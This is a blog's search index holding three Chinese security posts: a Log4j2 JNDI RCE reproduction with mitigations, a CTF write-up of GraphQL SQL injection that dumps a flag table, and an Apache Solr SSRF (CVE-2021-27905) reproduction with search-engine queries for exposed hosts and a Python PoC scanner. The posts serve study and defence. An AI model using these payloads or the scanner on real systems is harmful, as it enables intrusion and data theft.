<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Apache Log4j2 RCE漏洞复现</title>
    <url>/2021/12/11/Apache%20Log4j2%20RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Apache-Log4j2-RCE漏洞复现"><a href="#Apache-Log4j2-RCE漏洞复现" class="headerlink" title="Apache Log4j2 RCE漏洞复现"></a>Apache Log4j2 RCE漏洞复现</h1><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>Apache Log4j2是一个基于Java的日志记录工具。该工具重写了Log4j框架，并且引入了大量丰富的特性。该日志框架被大量用于业务系统开发，用来记录日志信息。大多数情况下，开发者可能会将用户输入导致的错误信息写入日志中。</p>
<p><strong>此次漏洞触发条件为只要外部用户输入的数据会被日志记录，即可造成远程代码执行</strong></p>
<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Apache Log4j 2.x &lt;= 2.14.1</span><br></pre></td></tr></table></figure>



<h3 id="漏洞简析"><a href="#漏洞简析" class="headerlink" title="漏洞简析"></a>漏洞简析</h3><p>由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p>
<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>在IDEA中新建一个Maven项目，在pom.xml中导入依赖文件下载log4j程序包</p>
<p>pom.xml文件如下:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-core&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-api --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;org.apache.logging.log4j&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;log4j-api&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;2.14.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>



<p>点击下载相应程序包资源</p>
<p>![image-20220207115326014](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115326014.png)</p>
<p>这里使用JNDI注入工具开启rmi服务或者idap服务执行本地命令，如下:</p>
<p>![image-20220207115341295](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115341295.png)</p>
<p>下面为测试Demo(由于我的jdk版本不适用RMI-JDNI注入，这里使用的是ldap协议)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger(Test.class);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:1389/ehm23c&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>运行结果:</p>
<p>![image-20220207115350383](Apache Log4j2 RCE漏洞复现&#x2F;image-20220207115350383.png)</p>
<h2 id="痕迹分析"><a href="#痕迹分析" class="headerlink" title="痕迹分析"></a>痕迹分析</h2><p>主要查看日志，观察日志中是否存在错误记录</p>
<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>经验证 2.15.0-rc1 版本存在绕过，实际受影响范围如下：</p>
<p>Apache Log4j 2.x &lt; 2.15.0-rc2</p>
<p>影响判断方式：用户只需排查Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</p>
<p><strong>已知影响组件</strong></p>
<ul>
<li>Apache Struts2</li>
<li>Apache Solr</li>
<li>Apache Flink</li>
<li>Apache Druid</li>
<li>ElasticSearch</li>
<li>flume</li>
<li>dubbo</li>
<li>Redis</li>
<li>logstash</li>
<li>kafka</li>
</ul>
<h2 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h2><p>1、禁止使用 log4j 服务器外连，升级 jdk 11.0.1 8u191 7u201 6u211 或更高版本。 </p>
<p>2、升级至 log4j-2.15.0-rc2： </p>
<p>下载地址：<a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc2</a> </p>
<p>3、紧急缓解措施： </p>
<p>（1） 修改 jvm 参数 -Dlog4j2.formatMsgNoLookups&#x3D;true </p>
<p>（2） 修改配置 log4j2.formatMsgNoLookups&#x3D;True </p>
<p>（3） 将系统环境变量FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置 为 true</p>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p>[1] <a href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a></p>
<p>[2] [<a href="https://issues.apache.org/jira/projects/LOG4J2/issues/LOG4J2-3201?filter=allissues">LOG4J2-3201] Limit the protocols jNDI can use and restrict LDAP. - ASF JIRA (apache.org)</a></p>
<p>[3] <a href="https://gitbox.apache.org/repos/asf?p=logging-log4j2.git;a=blob;f=log4j-core/src/test/java/org/apache/logging/log4j/core/lookup/JndiRestrictedLookupTest.java;h=032c9c4d85204e6490a734724c8d549c50de7164;hb=d82b47c">ASF Git Repos - logging-log4j2.git&#x2F;blob - log4j-core&#x2F;src&#x2F;test&#x2F;java&#x2F;org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiRestrictedLookupTest.java</a></p>
<p>[4] <a href="https://mp.weixin.qq.com/s/RXSiFrj5UOs3kzXSUsMbvw">Apache Log4j2RCE漏洞复现 (qq.com)</a></p>
]]></content>
      <categories>
        <category>Web漏洞</category>
        <category>Web容器漏洞</category>
        <category>Apache</category>
      </categories>
      <tags>
        <tag>-web漏洞 -Apache漏洞 -Log4j2</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF练习-Web系列-SQLI（一）</title>
    <url>/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/</url>
    <content><![CDATA[<h1 id="CTF学习-Web系列（一）-Graphql注入"><a href="#CTF学习-Web系列（一）-Graphql注入" class="headerlink" title="CTF学习-Web系列（一）-Graphql注入"></a>CTF学习-Web系列（一）-Graphql注入</h1><h2 id="靶场地址"><a href="#靶场地址" class="headerlink" title="靶场地址"></a>靶场地址</h2><p><a href="http://10.0.25.109:20080/">http://10.0.25.109:20080/</a></p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315131714807.png" class title="image-20220315131714807">

<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><h3 id="信息获取"><a href="#信息获取" class="headerlink" title="信息获取"></a>信息获取</h3><p>首先对其搜索框进行注入点探测，服务器返回错误信息</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315131956077.png" class title="image-20220315131956077">



<p>然后查看题目前端 JS代码，观察是否存在有用接口信息。</p>
<p>和上面burp拦截到的请求一样，并没有发现突破点，但看到了Graphql这个关键词，于是去看了下相关知识。</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315132845150.png" class title="image-20220315132845150">



<p><strong>第一步:构造语法查询模式和类型</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">     __schema &#123;</span><br><span class="line">        types &#123;</span><br><span class="line">           name</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可发现API返回信息中存在Getscorebyname和Getscorebyid</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315144558291.png" class title="image-20220315144558291">



<p><strong>第二步:查询可使用的名称</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">     __type(name:<span class="string">&quot;Query&quot;</span>)&#123;</span><br><span class="line">           name </span><br><span class="line">           fields</span><br><span class="line">           &#123;</span><br><span class="line">            name</span><br><span class="line">            type</span><br><span class="line">           &#123;</span><br><span class="line">          name</span><br><span class="line">          kind</span><br><span class="line">          ofType&#123;</span><br><span class="line">           name</span><br><span class="line">           kind</span><br><span class="line">                &#125;</span><br><span class="line">             &#125;</span><br><span class="line">           &#125;</span><br><span class="line">         &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可通过响应包中获取到对象getscorewithname和getscorewithid</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315145941819.png" class title="image-20220315145941819">



<p><strong>第三步:查询Getscorebyid的详细参数</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">    &#x27;__type&#x27;: &#123;</span><br><span class="line">        &#x27;name&#x27;:&#x27;Getscorebyid&#x27;,</span><br><span class="line">         &#x27;fields&#x27;: [</span><br><span class="line">            &#123;</span><br><span class="line">               &#x27;name&#x27;:&#x27;score&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">              &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">              &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">              &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;name&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">              &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">              &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">              &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;id&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">            &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">            &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">            &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>第四步:查询Getscorebyname的详细参数</strong></p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">    &#x27;__type&#x27;: &#123;</span><br><span class="line">        &#x27;name&#x27;:&#x27;Getscorebyname&#x27;,</span><br><span class="line">         &#x27;fields&#x27;: [</span><br><span class="line">            &#123;</span><br><span class="line">               &#x27;name&#x27;:&#x27;score&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                      &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                      &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                      &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;name&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                     &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                     &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                     &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">             &#123;</span><br><span class="line">                &#x27;name&#x27;:&#x27;userid&#x27;,</span><br><span class="line">                 &#x27;type&#x27;: &#123;</span><br><span class="line">                     &#x27;name&#x27;:&#x27;String&#x27;,</span><br><span class="line">                     &#x27;kind&#x27;:&#x27;SCALAR&#x27;,</span><br><span class="line">                     &#x27;ofType&#x27;:None</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        ]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="注入测试"><a href="#注入测试" class="headerlink" title="注入测试"></a>注入测试</h3><p>构造getscorewithid()请求数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;Alice&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>返回查询结果</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315152626025.png" class title="image-20220315152626025">



<p>对getscorewithname()进行注入测试</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT &#x27;aaa&#x27;||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>响应包中返回aaa，证明查询语句成功执行，存在注入</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315153100858.png" class title="image-20220315153100858">



<p>查询数据库版本</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:<span class="string">&quot;&#x27; UNION SELECT sqlite_version()||&#x27;&quot;</span>)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>数据库版本为3.31.1</p>
<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315155804488.png" class title="image-20220315155804488">





<p>构造查询数据获取表名flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT (SELECT group_concat(name,0x7e) from sqlite_master)||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315153747737.png" class title="image-20220315153747737">



<p>获取flag数据表的字段值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">query=&#123;</span><br><span class="line">  getscorewithname(name:&quot;&#x27; UNION SELECT (SELECT flag from flag)||&#x27;&quot;)&#123;</span><br><span class="line">  name</span><br><span class="line">  score</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<img src="/2022/03/15/CTF%E7%BB%83%E4%B9%A0-Web%E7%B3%BB%E5%88%97-SQLI%EF%BC%88%E4%B8%80%EF%BC%89/image-20220315154117172.png" class title="image-20220315154117172">

<p>得到flag为：flag{Rea1_flag_1s_Me}</p>
<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a href="https://blog.csdn.net/wy_97/article/details/110522150">渗透测试之graphQL_Sp4rkW的博客-CSDN博客_graphql注入</a></p>
<p><a href="https://hwlanxiaojun.github.io/2020/04/14/%E5%BD%93CTF%E9%81%87%E4%B8%8AGraphQL%E7%9A%84%E9%82%A3%E4%BA%9B%E4%BA%8B/">当CTF遇上GraphQL的那些事 (hwlanxiaojun.github.io)</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
        <category>SQL注入</category>
      </categories>
      <tags>
        <tag>-CTF -Web -Graphql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</title>
    <url>/2021/11/09/Apache%20Solr%20SSRF%20%E6%BC%8F%E6%B4%9E(CVE-2021-27905)%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现"><a href="#Apache-Solr-SSRF-漏洞-CVE-2021-27905-复现" class="headerlink" title="Apache Solr SSRF 漏洞(CVE-2021-27905)复现"></a>Apache Solr SSRF 漏洞(CVE-2021-27905)复现</h1><hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><hr>
<p>Apache Solr是一个开源的搜索服务，使用Java编写、运行在Servlet容器的一个独立的全文搜索服务器，是Apache Lucene项目的开源企业搜索平台。</p>
<p>该漏洞是由于没有对输入的内容进行校验，攻击者可利用该漏洞在未授权的情况下，构造恶意数据执行SSRF攻击，最终造成任意读取服务器上的文件。影响版本为Apache Solr &lt;&#x3D; 8.8.1。</p>
<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><a href="http://archive.apache.org/dist/lucene/solr/8.8.1/">Apache Solr环境下载</a></p>
<p>![image-20211115202638792](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115202638792.png)</p>
<p>解压完成后，进入文件夹下的bin目录，在命令行中执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">solr start -p 8983</span><br></pre></td></tr></table></figure>

<p>![image-20211115203019066](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203019066.png)</p>
<p>在浏览器上访问8983端口，可以看到Solr</p>
<p>![image-20211115203118220](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203118220.png)</p>
<p>下面我们为Solr创建Core</p>
<p>点击左边菜单栏的”Core Admin”选项，创建一个新的Core，发现上方出现报错信息。</p>
<p>![image-20211115203546935](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203546935.png)</p>
<p>我们来看下报错信息，如下:</p>
<p>![image-20211115203923524](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115203923524.png)</p>
<p>提示没找到solrconfig.xml文件在配置文件中。</p>
<p>我们进入Server文件夹下，可以看到new_core文件夹已经被创建成功。</p>
<p>![image-20211115204058647](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204058647.png)</p>
<p>这时，我们只需要把server&#x2F;solr&#x2F;configsets&#x2F;default文件夹下的conf目录整个拷贝到new_core文件夹下，就可以创建Core成功。</p>
<p>![image-20211115204355418](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204355418.png)</p>
<p>再次进行创建Core,成功创建</p>
<p>![image-20211115204436984](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204436984.png)</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p><strong>搜索引擎查询</strong></p>
<p>FOFA查询：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>



<p>Zoomeye查询:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app:&quot;APACHE-Solr&quot;</span><br></pre></td></tr></table></figure>



<p>下面开始对Solr进行漏洞探测.</p>
<p>通过构造特定的URL访问Solr，可以看到上方创建的Core名字。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br></pre></td></tr></table></figure>

<p>![image-20211115204811720](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115204811720.png)</p>
<p>solr 支持配置两个core，分别是主(master)和从(slave)，我们可以主动控制让从(slave)去获取主的备份，而master的地址在配置文件可以配置，也允许请求者指定。</p>
<p>poc格式:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core（上面创建的Core）/replication?command=fetchindex&amp;maste rUrl=http://xxx</span><br></pre></td></tr></table></figure>



<p>设置URL为DNSlog平台地址，可以看到返回200</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8983/solr/new_core/replication?command=fetchindex&amp;masterUrl=https://abc.53mliy.dnslog.cn/ss</span><br></pre></td></tr></table></figure>

<p>![image-20211115211804407](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211804407.png)</p>
<p>在Dnslog平台上可以看到有请求响应</p>
<p>![image-20211115211947915](Apache Solr SSRF 漏洞(CVE-2021-27905)复现&#x2F;image-20211115211947915.png)</p>
<p>这里提供一个poc脚本；</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># CVE-2021-27905</span></span><br><span class="line"><span class="comment"># Apache solr ssrf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> sys, getopt</span><br><span class="line">urllib3.disable_warnings()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">title</span>():</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------------      Apache Solr SSRF漏洞      ---------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------               CVE-2021-27905               ----------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------use:python3 CVE-2021-27905.py -u url -d dnslog--------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[--------              Author:Henry4E36            ------------]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[-------------------------------------------------------------]&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">commit</span>():</span></span><br><span class="line">    url = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt, agrs = getopt.getopt(sys.argv[<span class="number">1</span>:], <span class="string">&quot;hu:d:&quot;</span>, [<span class="string">&quot;help&quot;</span>, <span class="string">&quot;url=&quot;</span>,<span class="string">&quot;dnslog=&quot;</span>])</span><br><span class="line">        <span class="keyword">for</span> op, value <span class="keyword">in</span> opt:</span><br><span class="line">            <span class="keyword">if</span> op == <span class="string">&quot;-h&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--help&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">            [-]   Apache Solr SSRF漏洞 (CVE-2021-27905)</span></span><br><span class="line"><span class="string">            [-]   Options:</span></span><br><span class="line"><span class="string">                     -h or --help      :   方法说明</span></span><br><span class="line"><span class="string">                     -u or --url       :   站点URL地址</span></span><br><span class="line"><span class="string">                     -d or --dnslog    :   DnsLog</span></span><br><span class="line"><span class="string">                &quot;&quot;&quot;</span>)</span><br><span class="line">                sys.exit(<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-u&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--url=&quot;</span>:</span><br><span class="line">                url = value</span><br><span class="line">            <span class="keyword">elif</span> op == <span class="string">&quot;-d&quot;</span> <span class="keyword">or</span> op == <span class="string">&quot;--dnslog=&quot;</span>:</span><br><span class="line">                dnslog = value</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">                sys.exit()</span><br><span class="line">        <span class="keyword">return</span> url, dnslog</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 参数有误! eg:&gt;&gt;&gt; python3 CVE-2021-27905.py -u http://127.0.0.1 -d dnslog&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">target_core</span>(<span class="params">url</span>):</span></span><br><span class="line">    target_url = url + <span class="string">&quot;/solr/admin/cores?indexInfo=false&amp;wt=json&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url,headers=headers,verify=<span class="literal">False</span>,timeout=<span class="number">5</span>)</span><br><span class="line">        core = <span class="built_in">list</span>(json.loads(res.text)[<span class="string">&quot;status&quot;</span>])[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">return</span> core</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>,e)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ssrf</span>(<span class="params">core,dnslog</span>):</span></span><br><span class="line">    target_url = url + <span class="string">f&quot;/solr/<span class="subst">&#123;core&#125;</span>/replication/?command=fetchindex&amp;masterUrl=http://<span class="subst">&#123;dnslog&#125;</span>&quot;</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        res = requests.get(url=target_url, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">5</span>)</span><br><span class="line">        status = json.loads(res.text)[<span class="string">&quot;status&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> res.status_code == <span class="number">200</span> <span class="keyword">and</span> status == <span class="string">&quot;OK&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[!]  33[31m目标系统: <span class="subst">&#123;url&#125;</span> 可能存在SSRF漏洞，请检查DNSLog响应！33[0m&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[0]  目标系统: <span class="subst">&#123;url&#125;</span> 不存在SSRF漏洞&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!]  目标系统: <span class="subst">&#123;url&#125;</span> 出现意外！n &quot;</span>, e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    title()</span><br><span class="line">    url ,dnslog = commit()</span><br><span class="line">    core = target_core(url)</span><br><span class="line">    ssrf(core,dnslog)</span><br></pre></td></tr></table></figure>



<p>使用方法；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 CVE-2021-27905.py -u URL(Solr地址) -d dnslog(dnslog生成地址)</span><br><span class="line"></span><br><span class="line">      -h or --help      :   方法说明</span><br><span class="line">      -u or --url       :   站点URL地址</span><br><span class="line">      -d or --dnslog    :   DnsLog</span><br></pre></td></tr></table></figure>



<p>我们来运行一下该poc脚本:</p>
